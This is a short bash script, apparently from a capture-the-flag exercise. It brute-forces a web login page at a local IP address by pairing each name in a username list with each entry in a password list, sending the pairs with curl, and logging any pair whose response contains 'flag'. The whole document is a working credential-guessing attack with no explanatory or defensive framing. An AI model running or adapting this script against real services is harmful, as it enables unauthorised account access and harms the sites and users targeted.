for user in $(cat username.txt)
do
	for pass in $(cat passlist.txt)
	do
		flag=$(curl -s -X GET  "http://192.168.0.15/?page=signin&username=${user}&password=${pass}&Login=Login" | grep 'flag')
		if [ "${flag}" ]; then
			echo "SUCCES: username: ${user}, password: ${pass}"
			echo "username: ${user}, password: ${pass}" >> brutelist
		else
			echo "ECHEC: user: ${user}, password: ${pass}"
		fi
	done
done
